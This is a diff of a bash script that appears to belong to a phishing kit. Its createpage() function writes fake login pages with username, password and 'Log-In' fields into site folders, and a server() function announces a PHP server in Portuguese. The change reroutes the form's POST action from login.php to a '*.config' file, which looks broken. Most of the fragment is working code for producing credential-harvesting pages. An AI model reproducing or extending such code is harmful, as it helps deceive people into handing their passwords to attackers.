@@ -39,15 +39,21 @@ createpage() {
   default_pass_text="Password"
   default_sub_text="Log-In"
 
-  for login_page in $(find sites -type f -name 'login.php' -print); do
-    folder=$(dirname "$login_page")
+  for folder in sites/*/; do
+    config_file=$(find "$folder" -maxdepth 1 -type f -name '*.config' -print -quit)
+    
+    if [[ -z "$config_file" ]]; then
+      # Se não houver arquivo de configuração, continue para a próxima pasta
+      continue
+    fi
+
     echo "<!DOCTYPE html>" > "$folder/index.html"
     echo "<html>" >> "$folder/index.html"
     echo "<body bgcolor=\"gray\" text=\"white\">" >> "$folder/index.html"
     IFS=$'\n'
     printf '<center><h2> %s <br><br> %s </h2></center><center>\n' "$default_cap1" "$default_cap2" >> "$folder/index.html"
     IFS=$'\n'
-    printf '<form method="POST" action="%s"><label>%s </label>\n' "$login_page" "$user_text" >> "$folder/index.html"
+    printf '<form method="POST" action="%s"><label>%s </label>\n' "$config_file" "$user_text" >> "$folder/index.html"
     IFS=$'\n'
     printf '<br><label>%s: </label>' "$default_pass_text" >> "$folder/index.html"
     IFS=$'\n'
@@ -59,7 +65,6 @@ createpage() {
     printf '</html>\n' >> "$folder/index.html"
   done
 }
-
 
 server() {
   printf "\e[1;92m[\e[0m*\e[1;92m] Iniciando servidor PHP...\n"
